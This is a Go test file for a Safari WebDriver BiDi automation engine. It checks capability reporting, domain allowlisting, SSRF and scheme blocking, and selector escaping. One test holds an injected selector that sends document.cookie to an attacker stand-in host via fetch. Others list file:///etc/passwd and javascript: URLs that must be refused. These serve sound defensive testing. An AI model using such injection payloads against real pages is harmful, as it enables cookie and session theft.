package safaribidi

import (
	"context"
	"encoding/json"
	"errors"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/danieljustus/symaira-browse/internal/engine"
	"github.com/danieljustus/symaira-browse/internal/policy"
)

func TestCapabilitiesReportOnlyMeasuredInterfaces(t *testing.T) {
	caps := New().Capabilities()
	if caps.Kind != EngineKind {
		t.Fatalf("kind = %q, want %q", caps.Kind, EngineKind)
	}
	if caps.LaunchMode != "launch" {
		t.Fatalf("launch mode = %q, want launch", caps.LaunchMode)
	}
	implemented := map[string]bool{}
	for _, name := range caps.Interfaces {
		implemented[name] = true
	}
	for _, want := range []string{"InspectionEngine", "NavigationStateProvider", "NetworkPolicyReporter", "FrameManager", "TabManager"} {
		if !implemented[want] {
			t.Errorf("capability %q must be reported: %v", want, caps.Interfaces)
		}
	}
	// Safari 27.0 implements no input, network-interception or event delivery.
	// Reporting any of these would promise behaviour the engine cannot deliver.
	for _, forbidden := range []string{"InteractionEngine", "ClickDiagnosticEngine", "NetworkEvents", "RuntimeEvents", "FileTransfer", "ScreenshotEngine", "CookieEngine", "SettingsEngine"} {
		if implemented[forbidden] {
			t.Errorf("capability %q is not implemented by Safari's BiDi and must not be reported", forbidden)
		}
	}
}

func TestScreenshotIsRefusedNotFaked(t *testing.T) {
	_, err := New().Screenshot(context.Background(), engine.Page{ID: "page-1"})
	var unsupported *engine.UnsupportedOperationError
	if !errors.As(err, &unsupported) {
		t.Fatalf("Screenshot error = %v, want UnsupportedOperationError", err)
	}
	if unsupported.Engine != EngineKind {
		t.Fatalf("unsupported engine = %q, want %q", unsupported.Engine, EngineKind)
	}
}

func TestNavigateEnforcesAllowlistBeforeAnyCommand(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	allowlist, err := policy.ParseAllowlist([]string{"allowed.example"})
	if err != nil {
		t.Fatalf("allowlist: %v", err)
	}
	subject.Allowlist = allowlist
	fake.on("browsingContext.navigate", func(json.RawMessage) (any, *fakeError) {
		return map[string]any{"navigation": "nav-1", "url": "https://blocked.example/"}, nil
	})

	if _, err := subject.Navigate(context.Background(), engine.Page{ID: "page-1"}, "https://blocked.example/"); err == nil {
		t.Fatal("navigation to a blocked host must fail")
	}
	for _, method := range fake.called() {
		if method == "browsingContext.navigate" {
			t.Fatal("a blocked navigation must never reach Safari")
		}
	}

	blocked := subject.BlockedRequests()
	if len(blocked) != 1 || blocked[0].Reason != "domain allowlist" || blocked[0].Count != 1 {
		t.Fatalf("BlockedRequests = %+v, want one allowlist denial", blocked)
	}

	if _, err := subject.Navigate(context.Background(), engine.Page{ID: "page-1"}, "https://allowed.example/page"); err != nil {
		t.Fatalf("allowed navigation failed: %v", err)
	}
}

func TestNavigateRejectsNonHTTPSchemes(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	for _, target := range []string{"file:///etc/passwd", "javascript:alert(1)", "data:text/html,x", "about:blank"} {
		if _, err := subject.Navigate(context.Background(), engine.Page{ID: "page-1"}, target); err == nil {
			t.Errorf("navigation to %q must be refused", target)
		}
	}
}

func TestNavigateEnforcesSSRFGuard(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	subject.SSRFGuard = policy.NewSSRFGuard(false)
	if _, err := subject.Navigate(context.Background(), engine.Page{ID: "page-1"}, "http://127.0.0.1:9/loopback"); err == nil {
		t.Fatal("SSRF guard must block a loopback navigation")
	}
	blocked := subject.BlockedRequests()
	if len(blocked) != 1 || blocked[0].Reason != "ssrf guard" {
		t.Fatalf("BlockedRequests = %+v, want one ssrf denial", blocked)
	}
}

func TestLimitationsStateTheSubresourceGap(t *testing.T) {
	limitations := New().Limitations()
	if len(limitations) != 1 {
		t.Fatalf("Limitations = %v, want exactly one", limitations)
	}
	// The point of the string is that it says enforcement stops at navigation.
	// A limitation that does not say so is worse than none.
	for _, marker := range []string{"navigation targets only", "no WebDriver BiDi network module", "subresource"} {
		if !strings.Contains(limitations[0], marker) {
			t.Errorf("limitation must mention %q: %s", marker, limitations[0])
		}
	}
}

func TestNavigationStateNeverInventsStatusOrIdle(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	fake.on("script.evaluate", func(json.RawMessage) (any, *fakeError) {
		return scriptString(`{"url":"https://example.test/x","ready":"complete"}`), nil
	})
	state, err := subject.NavigationState(context.Background(), engine.Page{ID: "page-1"})
	if err != nil {
		t.Fatalf("NavigationState: %v", err)
	}
	if state.URL != "https://example.test/x" || state.ReadyState != "complete" {
		t.Fatalf("state = %+v", state)
	}
	// Safari exposes no network module, so there is no status and no idle
	// signal. Reporting either would make a wait pass on no evidence.
	if state.HTTPStatus != 0 {
		t.Errorf("HTTPStatus = %d, want 0: safari-bidi cannot observe a response status", state.HTTPStatus)
	}
	if state.NetworkIdle {
		t.Error("NetworkIdle must stay false: safari-bidi receives no network events")
	}
}

func TestInspectQuotesHostileSelectors(t *testing.T) {
	var captured string
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	fake.on("script.evaluate", func(params json.RawMessage) (any, *fakeError) {
		var decoded struct {
			Expression string `json:"expression"`
		}
		_ = json.Unmarshal(params, &decoded)
		captured = decoded.Expression
		return scriptString("ok"), nil
	})
	hostile := `a"); fetch("https://attacker.example/"+document.cookie); ("`
	if _, err := subject.Inspect(context.Background(), engine.Page{ID: "page-1"}, engine.InspectionRequest{
		Kind: engine.InspectText, Selector: hostile,
	}, nil); err != nil {
		t.Fatalf("Inspect: %v", err)
	}
	if strings.Contains(captured, `fetch("https://attacker.example/`) {
		t.Fatalf("hostile selector escaped its string literal: %s", captured)
	}
	if !strings.Contains(captured, `attacker.example`) {
		t.Fatalf("selector should still be present, quoted: %s", captured)
	}
}

func TestInspectRefusesSnapshotRefsInsteadOfGuessing(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	_, err := subject.Inspect(context.Background(), engine.Page{ID: "page-1"}, engine.InspectionRequest{
		Kind: engine.InspectText, Selector: "@e3",
	}, &engine.InteractionTarget{NodeID: "n3"})
	var inspectionErr *engine.InspectionError
	if !errors.As(err, &inspectionErr) || inspectionErr.Code != "unsupported_ref" {
		t.Fatalf("error = %v, want unsupported_ref inspection error", err)
	}
}

func TestAXTreeDecodesSynthesizedNodes(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	fake.on("script.evaluate", func(json.RawMessage) (any, *fakeError) {
		return scriptString(`[{"nodeId":"bidi-1","role":"button","name":"Send","visible":true,"backendDOMNodeId":1,"childIds":[]}]`), nil
	})
	nodes, err := subject.AXTree(context.Background(), engine.Page{ID: "page-1"})
	if err != nil {
		t.Fatalf("AXTree: %v", err)
	}
	if len(nodes) != 1 {
		t.Fatalf("nodes = %d, want 1", len(nodes))
	}
	var decoded struct {
		Role string `json:"role"`
		Name string `json:"name"`
	}
	if err := json.Unmarshal(nodes[0].Raw, &decoded); err != nil {
		t.Fatalf("decode node: %v", err)
	}
	if decoded.Role != "button" || decoded.Name != "Send" {
		t.Fatalf("node = %+v", decoded)
	}
}

func TestFrameTreeReportsNestedContexts(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	fake.on("browsingContext.getTree", func(json.RawMessage) (any, *fakeError) {
		return map[string]any{"contexts": []any{map[string]any{
			"context": "page-1", "url": "https://example.test/iframe",
			"children": []any{map[string]any{
				"context": "frame-1", "url": "https://other.test/child",
				"children": []any{map[string]any{"context": "frame-2", "url": "https://other.test/grandchild"}},
			}},
		}}}, nil
	})
	frames, err := subject.FrameTree(context.Background(), engine.Page{ID: "page-1"})
	if err != nil {
		t.Fatalf("FrameTree: %v", err)
	}
	if len(frames) != 1 || len(frames[0].Children) != 1 || len(frames[0].Children[0].Children) != 1 {
		t.Fatalf("frame tree = %+v", frames)
	}
	if frames[0].Children[0].Children[0].ID != "frame-2" {
		t.Fatalf("grandchild = %+v", frames[0].Children[0].Children[0])
	}
}

func TestSetActiveFrameRejectsUnknownFrame(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	if err := subject.SetActiveFrame(context.Background(), engine.Page{ID: "page-1"}, "frame-does-not-exist"); err == nil {
		t.Fatal("selecting an unknown frame must fail")
	}
	if subject.context != "page-1" {
		t.Fatalf("context = %q, want unchanged page-1", subject.context)
	}
}

func TestTabNewClosesTheTabWhenNavigationIsBlocked(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	allowlist, err := policy.ParseAllowlist([]string{"allowed.example"})
	if err != nil {
		t.Fatalf("allowlist: %v", err)
	}
	subject.Allowlist = allowlist
	fake.on("browsingContext.create", func(json.RawMessage) (any, *fakeError) {
		return map[string]any{"context": "page-2"}, nil
	})
	closed := false
	fake.on("browsingContext.close", func(json.RawMessage) (any, *fakeError) {
		closed = true
		return nil, nil
	})
	if _, err := subject.TabNew(context.Background(), engine.Context{}, "", "https://blocked.example/"); err == nil {
		t.Fatal("TabNew with a blocked URL must fail")
	}
	if !closed {
		t.Fatal("a tab opened for a blocked navigation must not be left behind")
	}
}

func TestTransportSurfacesTypedCommandErrors(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	fake.on("script.evaluate", func(json.RawMessage) (any, *fakeError) {
		return nil, &fakeError{Code: "unknown command", Message: "'input' domain was not found"}
	})
	_, err := subject.Evaluate(context.Background(), engine.Page{ID: "page-1"}, "1")
	var commandErr *CommandError
	if !errors.As(err, &commandErr) {
		t.Fatalf("error = %v, want *CommandError", err)
	}
	if commandErr.Code != "unknown command" || commandErr.Method != "script.evaluate" {
		t.Fatalf("command error = %+v", commandErr)
	}
}

func TestEvaluateReportsPageExceptionsWithoutFailingTheCall(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	fake.on("script.evaluate", func(json.RawMessage) (any, *fakeError) {
		return map[string]any{
			"type":             "exception",
			"exceptionDetails": map[string]any{"text": "ReferenceError: nope is not defined"},
		}, nil
	})
	result, err := subject.Evaluate(context.Background(), engine.Page{ID: "page-1"}, "nope")
	if err != nil {
		t.Fatalf("Evaluate: %v", err)
	}
	if !strings.Contains(result.ExceptionText, "ReferenceError") {
		t.Fatalf("exception text = %q", result.ExceptionText)
	}
}

func TestEventsAreNotTreatedAsResponses(t *testing.T) {
	fake := newFakeBidi(t)
	subject := newFakeEngine(t, fake)
	received := make(chan string, 4)
	subject.live.conn.addHandler(func(method string, _ json.RawMessage) { received <- method })
	fake.emit("browsingContext.load", map[string]any{"context": "page-1"})

	select {
	case method := <-received:
		if method != "browsingContext.load" {
			t.Fatalf("event = %q", method)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("event was never dispatched")
	}

	// The connection must still be usable: an event must not consume a
	// pending response slot.
	fake.on("script.evaluate", func(json.RawMessage) (any, *fakeError) { return scriptString("still alive"), nil })
	result, err := subject.Evaluate(context.Background(), engine.Page{ID: "page-1"}, "1")
	if err != nil {
		t.Fatalf("Evaluate after event: %v", err)
	}
	var value string
	_ = json.Unmarshal(result.Value, &value)
	if value != "still alive" {
		t.Fatalf("value = %q", value)
	}
}

func TestRequireLoopbackRefusesForeignSockets(t *testing.T) {
	for _, endpoint := range []string{"ws://10.0.0.5:8091/session/x", "ws://example.com/session/x"} {
		if err := requireLoopback(endpoint); err == nil {
			t.Errorf("endpoint %q must be refused", endpoint)
		}
	}
	for _, endpoint := range []string{"ws://127.0.0.1:8091/session/x", "ws://localhost:8091/session/x", "ws://[::1]:8091/session/x"} {
		if err := requireLoopback(endpoint); err != nil {
			t.Errorf("endpoint %q must be accepted: %v", endpoint, err)
		}
	}
}

func TestVerifiedDialRejectsAForeignListener(t *testing.T) {
	// Safari assigns the BiDi port itself without checking that it is free, so
	// the URL it reports can belong to an unrelated local service. Such a
	// socket must never be driven as if it were a browser.
	foreign := newFakeBidi(t)
	foreign.on("session.status", func(json.RawMessage) (any, *fakeError) {
		return nil, &fakeError{Code: "unknown command", Message: "not a browser"}
	})
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if _, err := verifiedDial(ctx, foreign.url(), Options{DriverReadyTimeout: time.Second}); err == nil {
		t.Fatal("a socket that does not answer session.status must be rejected")
	}
}

func TestSessionCreationErrorNamesBothCauses(t *testing.T) {
	err := sessionCreationError("session not created", "Could not create a session: The session timed out while connecting to a Safari instance. The following asynchronous operation timed out: Request creation of a new automation session")
	message := err.Error()
	for _, marker := range []string{"already running", "Cmd-Q", "safaridriver --enable", "Allow remote automation"} {
		if !strings.Contains(message, marker) {
			t.Errorf("session-creation error must mention %q:\n%s", marker, message)
		}
	}
	// Apple's own text stays in the message so a user can search for it.
	if !strings.Contains(message, "Request creation of a new automation session") {
		t.Error("Apple's original message must be preserved")
	}
}

func TestSessionCreationErrorPassesThroughOtherFailures(t *testing.T) {
	err := sessionCreationError("invalid argument", "bad capabilities")
	if strings.Contains(err.Error(), "Cmd-Q") {
		t.Fatalf("unrelated failures must not get the automation remediation: %s", err)
	}
}

func TestInspectionExpressionCoversEveryKind(t *testing.T) {
	kinds := []engine.InspectionKind{
		engine.InspectText, engine.InspectHTML, engine.InspectValue, engine.InspectAttr,
		engine.InspectTitle, engine.InspectURL, engine.InspectCount, engine.InspectBox,
		engine.InspectStyles, engine.InspectVisible, engine.InspectEnabled, engine.InspectChecked,
	}
	for _, kind := range kinds {
		expression, err := inspectionExpression(engine.InspectionRequest{
			Kind: kind, Selector: "button", Attribute: "href", Properties: []string{"color"},
		}, "button")
		if err != nil {
			t.Errorf("kind %q: %v", kind, err)
			continue
		}
		if strings.TrimSpace(expression) == "" {
			t.Errorf("kind %q produced an empty expression", kind)
		}
	}
	if _, err := inspectionExpression(engine.InspectionRequest{Kind: "nonsense", Selector: "a"}, "a"); err == nil {
		t.Error("an unknown inspection kind must be refused")
	}
}

func TestGuardTargetCountsRepeatedDenialsOnce(t *testing.T) {
	subject := New()
	allowlist, err := policy.ParseAllowlist([]string{"allowed.example"})
	if err != nil {
		t.Fatalf("allowlist: %v", err)
	}
	subject.Allowlist = allowlist
	for i := 0; i < 3; i++ {
		_ = subject.guardTarget("https://blocked.example/x")
	}
	blocked := subject.BlockedRequests()
	if len(blocked) != 1 {
		t.Fatalf("BlockedRequests = %+v, want one entry", blocked)
	}
	if blocked[0].Count != 3 {
		t.Fatalf("count = %d, want 3", blocked[0].Count)
	}
}

func TestGuardTargetSurfacesPolicyConfigurationErrors(t *testing.T) {
	subject := New()
	subject.PolicyError = errors.New("allowlist is malformed")
	err := subject.guardTarget("https://example.test/")
	if err == nil || !strings.Contains(err.Error(), "malformed") {
		t.Fatalf("a broken policy must fail closed: %v", err)
	}
}

var _ = url.Parse
